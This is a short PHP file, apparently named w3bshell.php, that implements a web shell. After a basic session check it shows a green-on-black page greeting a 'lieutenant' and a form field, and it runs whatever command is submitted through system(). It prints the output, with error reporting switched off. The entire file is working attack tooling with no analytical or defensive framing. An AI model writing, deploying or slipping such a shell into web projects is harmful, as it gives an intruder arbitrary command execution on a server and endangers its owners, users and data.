<?php 
error_reporting(0);
session_start();
if ($_SESSION["status"]!=="loggedin") {
die("Access denied!<br>Get away from my remote server! - sincerely Backend ^^");
}

// Customize font and background color

$backgroundColor = "black"; // Customizeable
$textColor = "green"; // Customizeable

// Custom name or nickname for welcome message

$name = "lieutenant";

?>
<html>
<head>
<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: <?=$backgroundColor?>;
            color: <?=$textColor?>;
            font-family: Arial, sans-serif;
        }

        form {
            width: 80%;
            margin: 0 auto;
        }

        input, .output {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            background-color: <?=$backgroundColor?>;
            border: 1px solid <?=$textColor?>;
        }
	h2 {
	text-align: center
}
    </style>

</head>
<body>
<h2>Welcome back <?= htmlspecialchars($name) ?></h2>
<form action="w3bshell.php" method=POST>
Shell code here:<br><br><input type="text" name="myCommandmentIsThisDO_IT" autocomplete="off">
<br><div class="output">
<pre>
<?php
if (isset($_POST['myCommandmentIsThisDO_IT'])) {
system($_POST['myCommandmentIsThisDO_IT']);
}

?>
</pre>
</div>
</body>
</html>
